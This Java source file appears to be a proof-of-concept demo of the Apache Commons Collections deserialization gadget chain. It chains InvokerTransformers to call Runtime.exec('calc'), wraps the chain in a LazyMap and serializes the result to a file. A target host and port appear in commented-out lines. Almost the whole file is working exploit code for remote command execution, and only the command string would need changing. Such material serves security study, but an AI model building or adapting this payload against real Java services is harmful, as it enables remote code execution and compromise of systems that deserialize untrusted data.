package summer.cc3bug;


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import summer.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;

/**
 * @ClassName: demo
 * @Description: TODO
 * @Author: Samny
 * @Date: 2020/5/1 10:36
 * @Version: v1.0.0
 * @Description:
 **/
public class demo {



    public static void main(String[] args) throws Exception {
        //目的服务器地址
//        String tas = "127.0.0.1";
        // 端口
//        int port = 6666;

        // payload
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}
                        ,new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}
                        ,new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}),
                new ConstantTransformer("66666!")

        };


//        final Transformer transformerChain = new ChainedTransformer(
//                new Transformer[]{ new ConstantTransformer(1) });

        Transformer transformerChain = new ChainedTransformer(transformers);



        // 创建漏洞map Object
        Map inmap = new HashMap();
        Map lazymap = LazyMap.decorate(inmap,transformerChain);
        lazymap.get("summer");

        // 写入序列化数据
        FileOutputStream fos = new FileOutputStream(new File("tempFile4"));
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(lazymap);
        oos.flush();

    }

}
